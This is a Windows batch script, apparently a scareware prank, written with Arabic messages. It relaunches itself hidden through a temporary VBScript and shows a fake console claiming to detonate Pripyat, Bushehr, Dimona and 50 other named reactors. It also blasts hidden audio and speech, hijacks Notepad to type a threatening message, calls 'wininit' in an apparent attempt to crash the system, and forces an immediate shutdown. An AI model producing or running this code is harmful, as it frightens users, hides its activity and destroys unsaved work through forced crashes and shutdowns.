@echo off
:: [01: STEALTH & PERSISTENCE]
chcp 65001 >nul
if not "%1"=="nuclear" (
    echo Set W=CreateObject("WScript.Shell") > "%temp%\nuke.vbs"
    echo W.Run chr(34) ^& "%~f0" ^& chr(34) ^& " nuclear", 0 >> "%temp%\nuke.vbs"
    wscript "%temp%\nuke.vbs" & del "%temp%\nuke.vbs" & exit /b
)

:: [02: THE GLOBAL REACTOR DESTRUCTION INTERFACE]
start "" cmd /k "color 0c & title HORMUZ_GLOBAL_OPERATIONS & mode con: cols=110 lines=45 & echo. & echo   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! & echo   !!                                                                                      !! & echo   !!                   [ ALERT: GLOBAL NUCLEAR DEPLOYMENT ACTIVE ]                        !! & echo   !!                                                                                      !! & echo   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! & echo. & echo   [SYSTEM]: تم استعمال الجهاز بنجاح & timeout /t 1 >nul & echo   [SYSTEM]: جارى ادخال الاوامر... & timeout /t 1 >nul & echo   [SYSTEM]: جاري التحكم... & timeout /t 1 >nul & echo   [SYSTEM]: قيد التنفيذ... & timeout /t 1 >nul & echo   [SUCCESS]: تم التحكم في الاجهزه النوويه بنجاح & echo. & color 4f & powershell -Command \"Write-Host '   [ACTION]: تدمير مفاعل بريبيات...' -ForegroundColor Red; [console]::beep(800, 300); Start-Sleep 1; Write-Host '   [DONE]: تم تفجير مفاعل بريبيات' -ForegroundColor Yellow; Start-Sleep 1; Write-Host '   [ACTION]: تدمير مفاعل بوشهر...' -ForegroundColor Red; [console]::beep(800, 300); Start-Sleep 1; Write-Host '   [DONE]: تم تفجير مفاعل بوشهر' -ForegroundColor Yellow; Start-Sleep 1; Write-Host '   [ACTION]: تدمير مفاعل ديمونة...' -ForegroundColor Red; [console]::beep(800, 300); Start-Sleep 1; Write-Host '   [DONE]: تم تفجير مفاعل ديمونة' -ForegroundColor Yellow; Write-Host '`n   [WAIT]: جاري معالجة الأهداف المتبقية...' -ForegroundColor Cyan; Start-Sleep 3; Write-Host '`n   [DANGER]: تم رصد 50 مفاعل إضافي.. جاري التفجير المتسلسل:' -ForegroundColor Red; $reactors = @('Fukushima', 'Zaporizhzhia', 'Three Mile Island', 'Sellafield', 'Kashiwazaki-Kariwa', 'Bruce', 'Hanul', 'Paluel', 'Gravelines', 'Cattenom', 'Qinshan', 'Fuqing', 'Hongyanhe', 'Yangjiang', 'Ningde', 'Wolseong', 'Takahama', 'Ohi', 'Genkai', 'Doel', 'Tihange', 'Emmerthal', 'Isar', 'Neckarwestheim', 'Biblis', 'Philippsburg', 'Unterweser', 'Grafenrheinfeld', 'Krümmel', 'Brunsbüttel', 'Stade', 'Mülheim-Kärlich', 'Lingen', 'Wyhl', 'Vahnum', 'Kalkar', 'Jülich', 'Hamm-Uentrop', 'Greifswald', 'Rheinsberg', 'Obninsk', 'Mayak', 'Seversk', 'Zheleznogorsk', 'Angarsk', 'Novouralsk', 'Zelenogorsk', 'Lesnoy', 'Sarov', 'Snezhinsk'); foreach($r in $reactors){ Write-Host \"   [DESTROYED]: تم تفجير مفاعل $r \" -ForegroundColor Red; [console]::beep((Get-Random -Min 400 -Max 1200), 50); Start-Sleep -m 100 };\" & echo. & echo   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! & echo   !!            سوف تطلق القنابل المتبقية خلال: [العد التنازلي بدأ]                       !! & echo   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! & echo. & powershell -Command \"4..1 | ForEach-Object { Write-Host -ForegroundColor Yellow '      [ T-MINUS: ' $_ ' SECONDS ] '; [console]::beep(1000, 500); Start-Sleep 1 }; Write-Host -ForegroundColor Red '      [ LAUNCHING GLOBAL STRIKE... ] '\" & timeout /t 1 >nul & exit"

:: [03: ASYNC AUDIO & 100 FEATURES]
start /b powershell -WindowStyle Hidden -Command "& {
    $v = New-Object -ComObject SAPI.SpVoice; $v.Volume = 100;
    [console]::beep(783, 600); [console]::beep(932, 1200);
    for($i=2000; $i -le 9000; $i+=180){ [console]::beep($i, 35) }
    1..100 | ForEach-Object { $v.Rate = (Get-Random -Min -5 -Max 5); $v.Speak('لماذا لا تضحك معي؟') }
}"

:: [04: THE GHOST TYPIST]
start notepad.exe
timeout /t 2 >nul
powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = 'سقط العالم... 53 مفاعلاً تحولوا إلى رماد... بريبيات، بوشهر، ديمونة، والبقية... 100 ميزة دمرت نظامك... هل تسمع صراخ الراعي؟.. لماذا لا تضحك معي؟.. ⭐ 𓅓𓅱𓏏'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Start-Sleep -Milliseconds 60}"

:: [05: FINAL DESTRUCTION]
timeout /t 15 >nul
powershell -Command "wininit" >nul 2>&1
shutdown -s -f -t 00 -c "𓅓𓅱𓏏.. نهاية العالم الرقمي."
